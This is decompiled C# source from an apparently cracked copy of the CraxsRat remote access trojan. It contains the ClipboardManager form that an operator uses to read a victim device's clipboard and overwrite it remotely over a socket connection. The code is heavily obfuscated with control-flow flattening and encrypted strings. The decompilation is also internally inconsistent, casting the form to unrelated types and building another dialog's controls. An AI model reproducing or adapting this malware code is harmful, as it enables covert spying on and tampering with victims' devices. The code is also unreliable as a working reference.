// Decompiled with JetBrains decompiler
// Type: Craxs_Rat.ClipboardManager
// Assembly: CraxsRat, Version=6.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 518449F5-7012-4EDA-9924-A26EC676C6A1
// Assembly location: C:\Users\HP\Downloads\CraxsRat v6.8 by TG @Hackfilter - Copy\CraxsRat VIP\CraxsRat_protected.exe

using Craxs_Rat.sockets;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

#nullable disable
namespace Craxs_Rat
{
  [DesignerGenerated]
  public class ClipboardManager : Form
  {
    public TcpClient Client;
    public Craxs_Rat.sockets.Client classClient;
    public string Title;
    public string tmpFolderUSER;
    public string tmpClientName;
    public string tmpCountry;
    public string tmpAddressIP;

    internal virtual Timer TOpacity
    {
      get => ((CraxsSettings) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = 251730256;
        while (true)
        {
          int num2 = num1;
          uint num3;
          Timer topacity;
          switch ((num3 = (uint) -((--1592582643 - (-(-(-1810801649 * -1986231423) + -528781463 * -91632061 * 1110844587 + ~(~-1219123971 + (-1437731268 - 224806308))) - num2)) * -1785610193 * -1881086633 * -1910953297)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              topacity.Tick -= eventHandler;
              num1 = (int) num3 * -760816323 ^ 601782823;
              continue;
            case 2:
              int num4 = topacity == null ? 1656850940 : (num4 = -358749056);
              num1 = num4 ^ (int) num3 * 370838961;
              continue;
            case 3:
              topacity = ((CraxsSettings) this)._TOpacity;
              int num5 = topacity == null ? -1071290555 : (num5 = 1225735768);
              num1 = num5 ^ (int) num3 * 1106120444;
              continue;
            case 4:
              topacity.Tick += eventHandler;
              num1 = (int) num3 * -1128038430 ^ -1327902012;
              continue;
            case 5:
              goto label_3;
            case 6:
              ((CraxsSettings) this)._TOpacity = value;
              topacity = ((CraxsSettings) this)._TOpacity;
              num1 = 197817154;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual Panel Panel1
    {
      get => ((CraxsSettings) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.Panel1_Paint);
label_1:
        int num1 = 412268961;
        Panel panel1;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(~num1 - (-372582300 + ~-(1766448267 ^ 1317519580)) - 1303792600) ^ --1252897104 ^ 739522324)) % 6U)
          {
            case 0:
              ((CraxsSettings) this)._Panel1 = value;
              panel1 = ((CraxsSettings) this)._Panel1;
              int num3;
              num1 = num3 = panel1 == null ? -1033781283 : (num3 = -552503122);
              continue;
            case 1:
              panel1.Paint += paintEventHandler;
              num1 = (int) num2 * 916322982 ^ -1172635421;
              continue;
            case 2:
              panel1 = ((CraxsSettings) this)._Panel1;
              int num4 = panel1 == null ? -135707705 : (num4 = -1943079958);
              num1 = num4 ^ (int) num2 * 182090828;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_3;
            case 5:
              panel1.Paint -= paintEventHandler;
              num1 = (int) num2 * -1359490389 ^ -1048896684;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
    }

    internal virtual Button BTN_GET
    {
      get => ((CraxsSettings) this)._BTN_GET;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.BTN_GET_Click);
        Button btnGet = ((CraxsSettings) this)._BTN_GET;
        if (btnGet == null)
          goto label_5;
label_1:
        int num1 = 1301220267;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) --~--((-(-210342215 * (-1734101841 * 1289558453) - -524815393 * --1873416704) ^ ~(--1840205366 + ~2006448211) - ~~(-2067821183 - -939782682)) - num2)) % 7U)
          {
            case 0:
              goto label_1;
            case 1:
              int num4 = btnGet == null ? 466129670 : (num4 = 59624019);
              num1 = num4 ^ (int) num3 * 147786381;
              continue;
            case 2:
              goto label_3;
            case 3:
              btnGet.Click += eventHandler;
              num1 = (int) num3 * 1681783513 ^ -1104048971;
              continue;
            case 4:
              btnGet = ((CraxsSettings) this)._BTN_GET;
              num1 = (int) num3 * -1378444954 ^ -1909928439;
              continue;
            case 5:
              goto label_5;
            case 6:
              btnGet.Click -= eventHandler;
              num1 = (int) num3 * 843712551 ^ 1628123022;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_5:
        ((CraxsSettings) this)._BTN_GET = value;
        num1 = 1679418505;
        goto label_2;
      }
    }

    internal virtual TextBox BoxClipboard
    {
      get => ((CraxsSettings) this)._BoxClipboard;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((CraxsSettings) this)._BoxClipboard = value;
      }
    }

    internal virtual Button BTN_SET
    {
      get => ((CraxsSettings) this)._BTN_SET;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.BTN_SET_Click);
        Button btnSet = ((CraxsSettings) this)._BTN_SET;
label_1:
        int num1 = -138753066;
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) ((-80541915 - 1778060789 - (~(num2 - (-578827197 - 859936669 + (650375167 * (-49429643 * -506886843) - ((1099411071 ^ 234835925) - -713274807)) - (-107866090 + ~(1082825135 - 1001953622 + (-1734129601 ^ 1095425004))))) + (1244857362 + 548611853 * 1907854840 - -449475153) ^ -1215784243 - (-1497810527 - -2049466846))) * 1281155139)) % 7U)
          {
            case 0:
              btnSet.Click -= eventHandler;
              num1 = (int) num3 * 2111583271 ^ -112521000;
              continue;
            case 1:
              goto label_3;
            case 2:
              btnSet.Click += eventHandler;
              num1 = (int) num3 * 1492918112 ^ 1263545971;
              continue;
            case 3:
              btnSet = ((CraxsSettings) this)._BTN_SET;
              int num4 = btnSet == null ? 606739579 : (num4 = 1387604009);
              num1 = num4 ^ (int) num3 * -1154781002;
              continue;
            case 4:
              int num5 = btnSet == null ? 1140440303 : (num5 = 2065489904);
              num1 = num5 ^ (int) num3 * -597070259;
              continue;
            case 5:
              goto label_1;
            case 6:
              ((CraxsSettings) this)._BTN_SET = value;
              num1 = 1613890571;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    private void ClipboardManager_Load(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u00346580E29);
label_1:
      int num1 = 125789009;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~(--((num1 ^ (-(572170303 * -178939649 ^ ~-464064422) ^ -~370069125 + (-135914697 * 1369604202 + (494744148 - 821583701))) - (1008267019 + 659497344 + (2112682786 ^ 2132887596) + (1424755357 - 2047027697) * 1718901313 ^ -~(100486518 - -639464423))) - -(~(1174476778 - 265466769) * 1255239639)) ^ 171985531 ^ -1879155531)) % 3U)
        {
          case 0:
            goto label_1;
          case 2:
            this.SpyStyle();
            num1 = (int) num2 * 1197669974 ^ 1519603337;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      this.Text = ((CraxsSettings) this).Title;
      this.TOpacity.Interval = Settings.T_Interval;
      this.TOpacity.Enabled = true;
    }

    public ClipboardManager()
    {
      this.Load += new EventHandler(this.ClipboardManager_Load);
      ((CraxsSettings) this).Title = EXGuarder.\u0036C4B3F0C;
      ((CraxsSettings) this).RectInputText0 = new List<Rectangle>();
      ((CameraManager.addsizedele) this).InitializeComponent();
      this.Font = Settings.f;
    }

    private void SpyStyle()
    {
      IEnumerator<TextBox> enumerator1;
      try
      {
        enumerator1 = this.Panel1.Controls.OfType<TextBox>().GetEnumerator();
label_1:
        int num1 = -861172385;
        TextBox current;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~-((num1 - (-837001724 + -((1687566803 ^ -119957059) - -2106030695 * 207308696) ^ 1640608777 * (-1373765823 * -1126231835) * 1597632973) ^ -924715424 * 1957194987 * 1805644891 ^ ~---1400768413) * -962798977 - (-1370185652 - -1954167789 * 831538654))) % 6U)
          {
            case 0:
              int num3;
              num1 = num3 = enumerator1.MoveNext() ? -1864813369 : (num3 = 1733600131);
              continue;
            case 1:
              num1 = (int) num2 * 1529394078 ^ -1991026318;
              continue;
            case 2:
              current.BackColor = Settings.DefaultColor_Background;
              List<Rectangle> rectInputText0 = ((CraxsSettings) this).RectInputText0;
              Point location = current.Location;
              int x = checked (location.X - 1);
              location = current.Location;
              int y = checked (location.Y - 1);
              int width = checked (current.Width + 1);
              int height = checked (current.Height + 1);
              Rectangle rectangle = new Rectangle(x, y, width, height);
              rectInputText0.Add(rectangle);
              num1 = (int) num2 * 1928170981 ^ 850862350;
              continue;
            case 4:
              goto label_1;
            case 5:
              current = enumerator1.Current;
              current.ForeColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num1 = -1629490010;
              continue;
            default:
              goto label_12;
          }
        }
      }
      finally
      {
        if (enumerator1 != null)
        {
label_8:
          int num4 = 1992655184;
          while (true)
          {
            uint num5;
            switch ((num5 = (uint) ~-((num4 - (-837001724 + -((1687566803 ^ -119957059) - -2106030695 * 207308696) ^ 1640608777 * (-1373765823 * -1126231835) * 1597632973) ^ -924715424 * 1957194987 * 1805644891 ^ ~---1400768413) * -962798977 - (-1370185652 - -1954167789 * 831538654))) % 3U)
            {
              case 0:
                goto label_8;
              case 1:
                enumerator1.Dispose();
                num4 = (int) num5 * 1590424238 ^ 451253848;
                continue;
              default:
                goto label_11;
            }
          }
        }
label_11:;
      }
label_12:
      IEnumerator<Button> enumerator2;
      try
      {
        enumerator2 = this.Panel1.Controls.OfType<Button>().GetEnumerator();
label_17:
        int num6 = enumerator2.MoveNext() ? -138868083 : (num6 = -844238666);
        Button current;
        while (true)
        {
          uint num7;
          switch ((num7 = (uint) ~-((num6 - (-837001724 + -((1687566803 ^ -119957059) - -2106030695 * 207308696) ^ 1640608777 * (-1373765823 * -1126231835) * 1597632973) ^ -924715424 * 1957194987 * 1805644891 ^ ~---1400768413) * -962798977 - (-1370185652 - -1954167789 * 831538654))) % 6U)
          {
            case 0:
              goto label_17;
            case 1:
              current.ForeColor = Settings.DefaultColor_Background;
              num6 = (int) num7 * -423545065 ^ 1666014665;
              continue;
            case 3:
              current = enumerator2.Current;
              num6 = -475726176;
              continue;
            case 4:
              current.BackColor = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
              num6 = (int) num7 * -817036780 ^ 1892262975;
              continue;
            case 5:
              num6 = -138868083;
              continue;
            default:
              goto label_24;
          }
        }
      }
      finally
      {
        if (enumerator2 != null)
        {
label_20:
          int num8 = 261856385;
          while (true)
          {
            uint num9;
            switch ((num9 = (uint) ~-((num8 - (-837001724 + -((1687566803 ^ -119957059) - -2106030695 * 207308696) ^ 1640608777 * (-1373765823 * -1126231835) * 1597632973) ^ -924715424 * 1957194987 * 1805644891 ^ ~---1400768413) * -962798977 - (-1370185652 - -1954167789 * 831538654))) % 3U)
            {
              case 0:
                goto label_20;
              case 1:
                enumerator2.Dispose();
                num8 = (int) num9 * 1081385387 ^ 1352249368;
                continue;
              default:
                goto label_23;
            }
          }
        }
label_23:;
      }
label_24:
      IEnumerator<Panel> enumerator3;
      try
      {
        enumerator3 = this.Controls.OfType<Panel>().GetEnumerator();
label_27:
        int num10 = enumerator3.MoveNext() ? 1541067798 : (num10 = 2094304307);
        Panel current;
        while (true)
        {
          uint num11;
          switch ((num11 = (uint) ~-((num10 - (-837001724 + -((1687566803 ^ -119957059) - -2106030695 * 207308696) ^ 1640608777 * (-1373765823 * -1126231835) * 1597632973) ^ -924715424 * 1957194987 * 1805644891 ^ ~---1400768413) * -962798977 - (-1370185652 - -1954167789 * 831538654))) % 5U)
          {
            case 0:
              goto label_27;
            case 1:
              current = enumerator3.Current;
              num10 = 1056269990;
              continue;
            case 2:
              num10 = 1541067798;
              continue;
            case 4:
              current.BackColor = Settings.DefaultColor_Background;
              num10 = (int) num11 * 343818420 ^ -1865929133;
              continue;
            default:
              goto label_35;
          }
        }
      }
      finally
      {
        if (enumerator3 != null)
        {
label_31:
          int num12 = -932565495;
          while (true)
          {
            uint num13;
            switch ((num13 = (uint) ~-((num12 - (-837001724 + -((1687566803 ^ -119957059) - -2106030695 * 207308696) ^ 1640608777 * (-1373765823 * -1126231835) * 1597632973) ^ -924715424 * 1957194987 * 1805644891 ^ ~---1400768413) * -962798977 - (-1370185652 - -1954167789 * 831538654))) % 3U)
            {
              case 1:
                enumerator3.Dispose();
                num12 = (int) num13 * -1393388865 ^ 148642266;
                continue;
              case 2:
                goto label_31;
              default:
                goto label_34;
            }
          }
        }
label_34:;
      }
label_35:
      this.Refresh();
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_6;
label_1:
      int num1 = 2090258351;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 ^ ~((2003591796 - -1562057085 ^ -47574536 ^ -1427404709) + (-1016150972 ^ 447905906 ^ -262353063)) + ((1861086346 - 647330366 + 1851494111 ^ 1823050201) - -(1414178531 ^ -1378797951 ^ 599598822 - 1126223399))) * -798952459 * 527229839 - (563035117 - 1751395691) * 1931415701)) % 5U)
        {
          case 0:
            num1 = (int) num2 * -1843772221 ^ -1425628633;
            continue;
          case 1:
            goto label_3;
          case 2:
            goto label_6;
          case 3:
            goto label_1;
          case 4:
            this.Opacity += 0.1;
            num1 = (int) num2 * 1368345517 ^ 371394382;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:
      return;
label_6:
      this.TOpacity.Enabled = false;
      num1 = -1669430826;
      goto label_2;
    }

    private void Panel1_Paint(object sender, PaintEventArgs e)
    {
      e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
label_1:
      int num1 = -1107349915;
      Color defaultColorForeground;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ((1883943675 - (~num2 - (-(1735130428 ^ -2018991780) + 842550528))) * -196214221 * 1045574127 ^ -857852888)) % 3U)
        {
          case 1:
            defaultColorForeground = getIconFrmReg.SHFILEINFOW.DefaultColor_Foreground;
            num1 = (int) num3 * -2140488176 ^ 1198575955;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_5:
      if (((CraxsSettings) this).RectInputText0.Count <= 0)
        return;
      List<Rectangle>.Enumerator enumerator;
      try
      {
        enumerator = ((CraxsSettings) this).RectInputText0.GetEnumerator();
label_7:
        int num4 = 1525327719;
        while (true)
        {
          int num5 = num4;
          uint num6;
          Rectangle current;
          switch ((num6 = (uint) ((1883943675 - (~num5 - (-(1735130428 ^ -2018991780) + 842550528))) * -196214221 * 1045574127 ^ -857852888)) % 7U)
          {
            case 0:
              goto label_9;
            case 1:
              current = enumerator.Current;
              num4 = 1086872861;
              continue;
            case 2:
              num4 = (int) num6 * 1297243593 ^ -333506454;
              continue;
            case 3:
              goto label_7;
            case 4:
              int num7;
              num4 = num7 = enumerator.MoveNext() ? -1074129468 : (num7 = -269257506);
              continue;
            case 5:
              int num8 = current.Width <= 0 ? -961598945 : (num8 = -1221195046);
              num4 = num8 ^ (int) num6 * -1638863830;
              continue;
            case 6:
              e.Graphics.FillRectangle((Brush) new SolidBrush(defaultColorForeground), current);
              num4 = (int) num6 * -1583039992 ^ 1423956285;
              continue;
            default:
              goto label_3;
          }
        }
label_9:
        return;
label_3:;
      }
      finally
      {
        enumerator.Dispose();
      }
    }

    private void BTN_SET_Click(object sender, EventArgs e)
    {
      if (((CraxsSettings) this).classClient == null)
        return;
label_1:
      int num1 = 1944092616;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) ~(-(-205015642 - 2028573815) * 1008940221 - (1377241739 * ((1937399740 ^ 187427387 - 1332795432) + (~1773651374 + (-2041281766 ^ -402451607))) - -num2) ^ (98637096 ^ -1841865220) - (798390051 + 1374360952))) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((CraxsSettings) this).classClient.SendMessage(new object[4]
            {
              (object) ((CraxsSettings) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00311576039 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00300471C1E + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.resultClient + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00328171301 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + this.BoxClipboard.Text),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0030932543F),
              (object) ((CraxsSettings) this).classClient
            });
            num1 = (int) num3 * 559439536 ^ 1348815739;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void BTN_GET_Click(object sender, EventArgs e)
    {
      if (((CraxsSettings) this).classClient == null)
        return;
label_1:
      int num1 = -148046265;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (-(~(-818262085 - 1155408966) ^ ~(-39847098 - 413973585)) - -num2 + (~(1134882214 ^ 405457621) - (-43695 - 1951257557) * 1967505777))) % 3U)
        {
          case 0:
            goto label_5;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ((CraxsSettings) this).classClient.SendMessage(new object[4]
            {
              (object) ((CraxsSettings) this).Client,
              (object) (Craxs_Rat.sockets.Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u003705E5828 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00346084A5C + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Craxs_Rat.sockets.Client.getClipboard + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003276A112A + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + EXGuarder.\u003335E0606),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u003335E0606),
              (object) ((CraxsSettings) this).classClient
            });
            num1 = (int) num3 * 1765784188 ^ 950494767;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing)
          return;
label_1:
        int num1 = -2037597499;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~((-num1 - (-2000968602 - (1390689031 + 1908108283) - (~385334117 + --904162217) + (~~797153558 ^ -(450430326 - -530547366)))) * -1612737587)) % 4U)
          {
            case 0:
              goto label_1;
            case 1:
              ((CraxsSettings) this).components.Dispose();
              num1 = (int) num2 * -729919328 ^ 982979660;
              continue;
            case 2:
              goto label_3;
            case 3:
              int num3 = ((CraxsSettings) this).components == null ? 254737500 : (num3 = -455487941);
              num1 = num3 ^ (int) num2 * 1437778512;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:;
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      ((CraxsSettings) this).components = (IContainer) new System.ComponentModel.Container();
label_1:
      int num1 = 530576027;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((num1 - (-~(1927701890 * -1895174853) ^ 271218407 * -(637351918 ^ 1758061349)) * 238824681) * -1822854221 ^ 1081918527 * ((831165296 ^ 807220155) - 249692471)) - (780806777 - 1397801532 ^ 1745744347 * 941173333))) % 50U)
        {
          case 0:
            ((Color_Box0) this).C_Box3.Size = new Size(50, 48);
            num1 = (int) num2 * 797854100 ^ 111708680;
            continue;
          case 1:
            ((Color_Box0) this).BTN_OK.FlatStyle = FlatStyle.Flat;
            num1 = (int) num2 * -634897808 ^ 18943069;
            continue;
          case 2:
            ((Color_Box0) this).CK1.Tag = (object) EXGuarder.\u00367795955;
            num1 = (int) num2 * 159349664 ^ 175850430;
            continue;
          case 3:
            this.SuspendLayout();
            num1 = (int) num2 * 1045022009 ^ -972274804;
            continue;
          case 4:
            this.Controls.Add((Control) ((Color_Box0) this).C_Box2);
            num1 = (int) num2 * -853138301 ^ -1557860984;
            continue;
          case 5:
            this.AutoScaleDimensions = new SizeF(6f, 13f);
            num1 = (int) num2 * 983047441 ^ 673246767;
            continue;
          case 6:
            ((Color_Box0) this).C_Box3.TabStop = false;
            num1 = (int) num2 * 441580979 ^ 223681731;
            continue;
          case 7:
            ((Color_Box0) this).BTN_OK.Location = new Point(3, 142);
            num1 = (int) num2 * 2143967369 ^ -841893469;
            continue;
          case 8:
            this.MinimizeBox = false;
            num1 = (int) num2 * -1035731142 ^ -729708068;
            continue;
          case 9:
            this.StartPosition = FormStartPosition.CenterScreen;
            this.Text = EXGuarder.\u00363275129;
            ((ISupportInitialize) ((Color_Box0) this).C_Box3).EndInit();
            num1 = (int) num2 * -1375205414 ^ -1147472731;
            continue;
          case 10:
            ((Color_Box0) this).BTN_OK.UseVisualStyleBackColor = false;
            num1 = (int) num2 * -723089065 ^ -1109477360;
            continue;
          case 11:
            ((Color_Box0) this).C_Box2.Location = new Point(3, 117);
            ((Color_Box0) this).C_Box2.Name = EXGuarder.\u0031073220C;
            num1 = (int) num2 * -282241330 ^ 1592930636;
            continue;
          case 12:
            ((Color_Box0) this).C_Box0.BorderStyle = BorderStyle.FixedSingle;
            ((Color_Box0) this).C_Box0.Location = new Point(3, 3);
            ((Color_Box0) this).C_Box0.Name = EXGuarder.\u003191A1A49;
            num1 = (int) num2 * 1616766293 ^ -313654165;
            continue;
          case 13:
            ((Color_Box0) this).C_Box3.BorderStyle = BorderStyle.FixedSingle;
            ((Color_Box0) this).C_Box3.Location = new Point(98, 117);
            ((Color_Box0) this).C_Box3.Name = EXGuarder.\u0034B4A4E0B;
            num1 = (int) num2 * -1536840969 ^ 529968029;
            continue;
          case 14:
            this.ShowInTaskbar = false;
            num1 = (int) num2 * 1282098962 ^ 36476353;
            continue;
          case 15:
            ((Color_Box0) this).C_Box0.Size = new Size(145, 86);
            ((Color_Box0) this).C_Box0.TabIndex = 4;
            ((Color_Box0) this).C_Box0.TabStop = false;
            num1 = (int) num2 * -412430011 ^ -2052578418;
            continue;
          case 16:
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            num1 = (int) num2 * 1855216688 ^ -563510272;
            continue;
          case 17:
            ((Color_Box0) this).BTN_OK.Size = new Size(93, 23);
            ((Color_Box0) this).BTN_OK.TabIndex = 5;
            num1 = (int) num2 * -1748652837 ^ 1978209459;
            continue;
          case 18:
            this.Controls.Add((Control) ((Color_Box0) this).BTN_OK);
            num1 = (int) num2 * -276698270 ^ 1264466037;
            continue;
          case 19:
            ((Color_Box0) this).C_Box2.BorderStyle = BorderStyle.FixedSingle;
            num1 = (int) num2 * 104084869 ^ 1140543886;
            continue;
          case 20:
            ((Color_Box0) this).BTN_OK.Text = EXGuarder.\u0031D536958;
            num1 = (int) num2 * 1379135459 ^ 2105285614;
            continue;
          case 21:
            goto label_1;
          case 22:
            ((Color_Box0) this).BoxTitle.Size = new Size(151, 18);
            ((Color_Box0) this).BoxTitle.TabIndex = 9;
            num1 = (int) num2 * 1667089837 ^ 478363791;
            continue;
          case 23:
            ((ISupportInitialize) ((Color_Box0) this).C_Box2).BeginInit();
            ((ISupportInitialize) ((Color_Box0) this).C_Box0).BeginInit();
            num1 = (int) num2 * -173914702 ^ 1201106991;
            continue;
          case 24:
            ((Color_Box0) this).C_Box0 = new PictureBox();
            num1 = (int) num2 * 1569939644 ^ -922511377;
            continue;
          case 25:
            ((ISupportInitialize) ((Color_Box0) this).BoxTitle).BeginInit();
            num1 = (int) num2 * -165184778 ^ -1424559369;
            continue;
          case 26:
            ((ISupportInitialize) ((Color_Box0) this).BoxTitle).EndInit();
            num1 = (int) num2 * 1855633199 ^ -401150132;
            continue;
          case 27:
            ((Color_Box0) this).C_Box3 = new PictureBox();
            ((Color_Box0) this).C_Box2 = new PictureBox();
            ((Color_Box0) this).BTN_OK = new Button();
            num1 = (int) num2 * 2056011762 ^ 1391986340;
            continue;
          case 28:
            this.Name = EXGuarder.\u00378324A79;
            num1 = (int) num2 * -775515584 ^ -605445624;
            continue;
          case 29:
            ((Color_Box0) this).BoxTitle.TabStop = false;
            num1 = (int) num2 * 182261374 ^ 401102815;
            continue;
          case 30:
            ((Color_Box0) this).C_Box3.TabIndex = 7;
            num1 = (int) num2 * -1079891018 ^ -604385214;
            continue;
          case 31:
            ((Color_Box0) this).BoxTitle.Dock = DockStyle.Bottom;
            num1 = (int) num2 * -256475868 ^ -1435621350;
            continue;
          case 32:
            ((Color_Box0) this).CK1.Name = EXGuarder.\u003745B1528;
            ((Color_Box0) this).CK1.Size = new Size(93, 17);
            ((Color_Box0) this).CK1.TabIndex = 8;
            num1 = (int) num2 * 187745030 ^ 813638254;
            continue;
          case 33:
            ((Color_Box0) this).CK1 = new CheckBox();
            num1 = (int) num2 * -1041227960 ^ 1845615354;
            continue;
          case 34:
            this.AutoScaleMode = AutoScaleMode.Font;
            this.ClientSize = new Size(151, 187);
            num1 = (int) num2 * 1514192936 ^ -793432648;
            continue;
          case 35:
            ((Color_Box0) this).ti = new Timer(((CraxsSettings) this).components);
            num1 = (int) num2 * -838342533 ^ 1891753356;
            continue;
          case 36:
            ((Color_Box0) this).C_Box2.Size = new Size(93, 19);
            ((Color_Box0) this).C_Box2.TabIndex = 6;
            ((Color_Box0) this).C_Box2.TabStop = false;
            ((Color_Box0) this).BTN_OK.BackColor = Color.FromArgb(240, 240, 240);
            num1 = (int) num2 * 1789411417 ^ -1763333225;
            continue;
          case 37:
            ((Color_Box0) this).CK1.AutoSize = true;
            ((Color_Box0) this).CK1.Location = new Point(3, 94);
            num1 = (int) num2 * 1446339643 ^ 1227341071;
            continue;
          case 38:
            ((Color_Box0) this).BTN_OK.Name = EXGuarder.\u003490A6642;
            num1 = (int) num2 * 826934294 ^ -203338799;
            continue;
          case 39:
            ((Color_Box0) this).BoxTitle.BackColor = Color.Black;
            num1 = (int) num2 * 280934058 ^ -970125179;
            continue;
          case 40:
            ((Color_Box0) this).BoxTitle.ErrorImage = (Image) null;
            ((Color_Box0) this).BoxTitle.InitialImage = (Image) null;
            ((Color_Box0) this).BoxTitle.Location = new Point(0, 169);
            ((Color_Box0) this).BoxTitle.Name = EXGuarder.\u0033E332377;
            num1 = (int) num2 * 378839076 ^ -1063136158;
            continue;
          case 41:
            goto label_3;
          case 42:
            ((Color_Box0) this).BoxTitle = new PictureBox();
            ((ISupportInitialize) ((Color_Box0) this).C_Box3).BeginInit();
            num1 = (int) num2 * 908030453 ^ 1029396605;
            continue;
          case 43:
            this.Controls.Add((Control) ((Color_Box0) this).C_Box3);
            num1 = (int) num2 * 1795051778 ^ -1205995130;
            continue;
          case 44:
            ((Color_Box0) this).CK1.Text = EXGuarder.\u0032C211567;
            ((Color_Box0) this).CK1.UseVisualStyleBackColor = true;
            num1 = (int) num2 * 174372582 ^ 638490187;
            continue;
          case 45:
            this.Controls.Add((Control) ((Color_Box0) this).C_Box0);
            num1 = (int) num2 * -1228088129 ^ -1194470133;
            continue;
          case 46:
            this.ResumeLayout(false);
            this.PerformLayout();
            num1 = (int) num2 * 1701618031 ^ -291966659;
            continue;
          case 47:
            ((Color_Box0) this).BTN_OK.ForeColor = Color.Black;
            num1 = (int) num2 * 1789310167 ^ -835368652;
            continue;
          case 48:
            this.Controls.Add((Control) ((Color_Box0) this).BoxTitle);
            this.Controls.Add((Control) ((Color_Box0) this).CK1);
            num1 = (int) num2 * -50544057 ^ -443687763;
            continue;
          case 49:
            ((ISupportInitialize) ((Color_Box0) this).C_Box2).EndInit();
            ((ISupportInitialize) ((Color_Box0) this).C_Box0).EndInit();
            num1 = (int) num2 * -4941149 ^ 1706469871;
            continue;
          default:
            goto label_52;
        }
      }
label_3:
      return;
label_52:;
    }
  }
}
